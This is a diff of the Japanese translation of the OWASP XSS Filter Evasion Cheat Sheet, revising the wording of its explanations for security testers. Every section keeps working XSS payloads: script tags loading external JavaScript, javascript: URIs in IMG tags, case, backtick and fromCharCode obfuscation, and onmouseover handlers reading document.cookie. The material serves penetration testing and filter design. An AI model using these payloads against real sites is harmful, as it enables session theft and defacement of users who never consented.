@@ -175,68 +175,68 @@ mw.loader.load(["mediawiki.page.startup","mediawiki.legacy.wikibits","mediawiki.
 <li class="toclevel-1 tocsection-109"><a href="#Other_Cheatsheets"><span class="tocnumber">5</span> <span class="toctext">その他のチートシート</span></a></li>
 </ul>
 </div>
-この資料は、アプリケーションセキュリティのテスト技術者に、クロスサイトスクリプティングのテストを支援するガイドを提供することに重点を置いています。この資料の内容は最初に、RSnake によって、彼のセミナーの XSS チートシート (以下を参照) から OWASP に寄付されました。<a rel="nofollow" class="external free" href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>.現在このサイトにアクセスすると、この新しいサイトにリダイレクトされるようになっており、今後はここで保守や強化が行われる予定です。最初に作成された OWASP 対策チートシート、<a href="/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" title="クロスサイトスクリプティング (XSS) 対策チートシート">XSS (クロスサイトスクリプティング) 対策チートシート</a>は、RSnake の XSS チートシートをベースにして作成しており、彼に謝意を表します。私たちは、攻撃に関する複雑なチートシートにあらゆる巧妙なトリックを列挙して、とにかくこれらを防ぐアプリケーションを構築せよと開発者に言うのではなく、XSS を防止するために準拠するべき、短く簡潔なガイドラインを作成したいと考えました。その結果生まれたのが、<a href="/index.php/Cheat_Sheets" title="チートシート" class="mw-redirect">OWASP チートシートシリーズ</a>です。
+この資料は、アプリケーションのセキュリティテストを行う技術者に、クロスサイトスクリプティングのテストを支援するガイドを提供することに重点を置いています。この資料の初期版は、RSnake から OWASP に寄付されたもので、彼のセミナーの XSS チートシートが元になっています(<a rel="nofollow" class="external free" href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>)。現在このサイトにアクセスすると、この新しいサイトにリダイレクトされるようになっており、今後はここで保守や強化が行われる予定です。最初に作成された OWASP 対策チートシート、<a href="/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" title="クロスサイトスクリプティング (XSS) 対策チートシート">XSS (クロスサイトスクリプティング) 対策チートシート</a>は、RSnake の XSS チートシートをベースにしています。彼に謝意を表します。私たちは、攻撃に関する複雑なチートシートにあらゆる巧妙なトリックを列挙して、とにかくこれらを防ぐアプリケーションを構築せよと開発者に言うのではなく、XSS を防止するために準拠するべき、短く簡潔なガイドラインを作成したいと考えました。その結果生まれたのが、<a href="/index.php/Cheat_Sheets" title="チートシート" class="mw-redirect">OWASP チートシートシリーズ</a>です。
 <h1><span class="mw-headline" id="Tests">テスト</span></h1>
 <p>このチートシートは、XSS 攻撃の基本を既に理解しており、フィルター回避の意味をより詳しく理解したいユーザーを対象にしています。 
-</p><p>これらのクロスサイトスクリプティング (XSS) ベクトルの大半は、スクリプトの下部にリストされているブラウザーでテスト済みです。
+</p><p>これらのクロスサイトスクリプティング (XSS) 手法の大半は、スクリプトの下部にリストされているブラウザーでテスト済みです。
 </p>
 <h2><span class="mw-headline" id="XSS_Locator">XSS ロケーター</span></h2>
-<p>次の文字列を挿入します。特別な XSS ベクトル要件がなくてもスクリプトが脆弱な場合は通常、”XSS" という単語がポップアップされます。この <a rel="nofollow" class="external text" href="http://ha.ckers.org/xsscalc.html">URL エンコード計算機能</a>を使用して、文字列全体をエンコードします。ヒント: 急いでページをチェックする必要がある場合、多くの場合、より下位の "&lt;PLAINTEXT&gt" タグを挿入するだけで十分です。出力が明示的に破壊されるので、XSS に対して脆弱かどうかを確認できます。
+<p>次の文字列を挿入します。特別な XSS ベクトル要件がなくてもスクリプトが脆弱な場合は通常、”XSS" という単語がポップアップされます。<a rel="nofollow" class="external text" href="http://ha.ckers.org/xsscalc.html">URL エンコーダ</a>を使用して、文字列全体をエンコードしてください。ヒント: 急いでページをチェックする必要があるなら、"&lt;PLAINTEXT&gt" タグを挿入するだけで多くの場合十分です。出力が明示的に破壊されるので、XSS に対して脆弱かどうかを確認できます。
 </p>
 <pre>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//&quot;;
 alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--
 &gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
 </pre>
 <h2><span class="mw-headline" id="XSS_Locator_.28short.29">XSS ロケーター (短縮版)</span></h2>
-<p>スペースに余裕がなく、ページに脆弱な JavaScript がないことがわかっている場合、この文字列は、コンパクトな XSS インジェクションチェックとして最適です。挿入後のソースを確認し、&lt;XSS が &amp;&lt;XSS に変換されているかどうか調べて、脆弱かどうか確認します。
+<p>スペースに余裕がなく、ページ内に脆弱な JavaScript が含まれていないことがわかっている場合、この文字列は、コンパクトな XSS インジェクションチェックとして最適です。挿入後のソースを確認し、&lt;XSS が &amp;&lt;XSS に変換されているかどうかを調べることで、脆弱かどうか確認します。
 </p>
 <pre>&#39;&#39;;!--"&lt;XSS&gt;=&amp;{()}
 </pre>
 <h2><span class="mw-headline" id="No_Filter_Evasion">フィルター回避なし</span></h2>
-<p>これは通常の XSS JavaScript インジェクションであり、捕捉されやすいのですが、最初にこれを試すことを推奨します (最新のブラウザーの多くで引用符は必要ないため、ここでも省略します)。
+<p>これは通常の XSS JavaScript インジェクションであり、XSS フィルターで捕捉される可能性が高いのですが、最初にこれを試すことを推奨します (最新のブラウザーの多くでは引用符は必要ないため、ここでも省略しています)。
 </p>
 <pre>&lt;SCRIPT SRC=http:&#47;&#47;ha.ckers.org&#47;xss.js&gt;&lt;/SCRIPT&gt;
 </pre>
-<h2><span class="mw-headline" id="Image_XSS_using_the_JavaScript_directive">JavaScript ディレクティブを使用したイメージ XSS</span></h2>
-<p>JavaScript ディレクティブを使用したイメージ XSS (IE 7.0 は、イメージのコンテキストで JavaScript ディレクティブをサポートしていませんが、他のコンテキストではサポートしています。ただし、以下の例は、他のタグと同様に動作するものとして示されています。)
+<h2><span class="mw-headline" id="Image_XSS_using_the_JavaScript_directive">イメージタグを使用した XSS</span></h2>
+<p>イメージタグを使用した XSS (IE 7.0 は、イメージのコンテキストで JavaScript ディレクティブをサポートしていませんが、他のコンテキストではサポートしています。以下の例は、他のタグと同様に動作するものとして示されています。)
 </p>
 <pre>&lt;IMG SRC="javascript:alert('XSS');"&gt;
 </pre>
 <h2><span class="mw-headline" id="No_quotes_and_no_semicolon">引用符なし、セミコロンなし</span></h2>
 <pre>&lt;IMG SRC=javascript:alert('XSS')&gt;
 </pre>
-<h2><span class="mw-headline" id="Case_insensitive_XSS_attack_vector">大文字小文字を区別する XSS 攻撃ベクトル</span></h2>
+<h2><span class="mw-headline" id="Case_insensitive_XSS_attack_vector">大文字小文字を混在させた XSS 攻撃</span></h2>
 <pre>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
 </pre>
 <h2><span class="mw-headline" id="HTML_entities">HTML エンティティ</span></h2>
-<p>動作するにはセミコロンが必要です。
+<p>XSS 攻撃が成功するにはセミコロンが必要です。
 </p>
 <pre>&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
 </pre>
-<h2><span class="mw-headline" id="Grave_accent_obfuscation">抑音符号の難読化</span></h2>
-<p>二重引用符と一重引用符の両方を使用する必要がある場合、抑音符号を使用して JavaScript の文字列をカプセル化できます。これは、クロスサイトスクリプティングフィルターの多くが抑音符号を認識しないため有効です。
+<h2><span class="mw-headline" id="Grave_accent_obfuscation">バッククォート文字を使った難読化</span></h2>
+<p>二重引用符と一重引用符の両方を使用する必要がある場合、バッククォート文字で JavaScript 文字列を囲むとよいでしょう。XSS フィルターの多くがバッククォート文字を認識しないこともあり、有用な方法です。
 </p>
 <pre>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
 </pre>
-<h2><span class="mw-headline" id="Malformed_A_tags">誤った形式の A タグ</span></h2>
-<p>HREF 属性をスキップして、XXS の本質に到達します... 
-David Cross による投稿 ~ Chromeで確認済み
+<h2><span class="mw-headline" id="Malformed_A_tags">不正な形式の A タグ</span></h2>
+<p>HREF 属性を省略して、XSS に必要な部分だけを示します...
+David Cross による投稿です。Chromeで確認済みです。
 </p><p>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
-</p><p>Chrome は、ユーザーのために欠落した引用符を置換してくれます。引用符がないままにしていても、Chrome は適切な場所に引用符を配置し、URL またはスクリプトで欠落した引用符を修正します。
+</p><p>Chrome は、ユーザーのために欠落した引用符を補ってくれます... 引用符がないままにしていても、Chrome は URL やスクリプトの適切な場所に引用符を配置してくれます。
 </p><p>&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
 </p>
-<h2><span class="mw-headline" id="Malformed_IMG_tags">誤った形式の IMG タグ</span></h2>
-<p>元々は Begeek が発見しました (クリーンアップされ、すべてのブラウザーで動作するように短縮化されています)。この XSS ベクトルは、指定の緩いレンダリングエンジンを使用して、IMG タグ内に XSS ベクトルを作成します。これは、引用符で囲んでカプセル化する必要があります。元々、ずさんなコーディングを修正することを目的としていたと思われます。これによって、HTML タグを正しく解析するのが非常に難しくなります。
+<h2><span class="mw-headline" id="Malformed_IMG_tags">不正な形式の IMG タグ</span></h2>
+<p>Begeek が発見したものを元にクリーンアップされ、すべてのブラウザーで動作するように短縮化されています。スクリプト部分は引用符で囲まれているように見えますが、処理の緩いレンダリングエンジンでは、IMG タグ内に XSS スクリプトが置かれていると認識してしまいます。そのような挙動は、元々、ずさんなコードに対応することを目的としていたと思われますが、これによって、HTML タグを正しく解析するのが非常に難しくなります。
 </p>
 <pre>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
 </pre>
 <h2><span class="mw-headline" id="fromCharCode">fromCharCode</span></h2>
-<p>引用符がいっさい許可されていない場合、JavaScript で fromCharCode を eval() 関数で処理して、必要な XSS ベクトルを作成できます。
+<p>引用符の類が許可されない場合には、JavaScript の fromCharCode 関数呼出しを eval() 関数で処理することで、必要な XSS スクリプトを生成できます。
 </p>
 <pre>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
 </pre>
-<h2><span class="mw-headline" id="Default_SRC_tag_to_get_past_filters_that_check_SRC_domain">SRC タグを初期化して、SRC ドメインを確認するフィルターを通過する</span></h2>
-<p>これは、大半の SRC ドメインフィルターをバイパスします。Javascript のイベントメソッドへの挿入は、Form、Iframe、Input、Embed などの要素を使用する、あらゆる HTML タグタイプの挿入にも適用できます。onblur、onclick など、タグタイプの関連イベントを代入できるため、ここで挙げた多くのインジェクションに関して多数のバリエーションを提供できます。
+<h2><span class="mw-headline" id="Default_SRC_tag_to_get_past_filters_that_check_SRC_domain">SRC 属性に空のページ内アンカーを設定することで、SRC ドメインフィルターを通過する</span></h2>
+<p>大半の SRC ドメインフィルターを回避します。Javascript コードのイベントメソッドへの挿入は、Form、Iframe、Input、Embed などの HTML タグタイプに応用できます。また、onblur や onclick などの関連イベントにも代入できるため、ここで挙げた多くのインジェクションに関して多数のバリエーションを提供できます。
 David Cross による投稿。
 </p><p>Abdullah Hussam(@Abdulahhusam) による編集。
 </p>
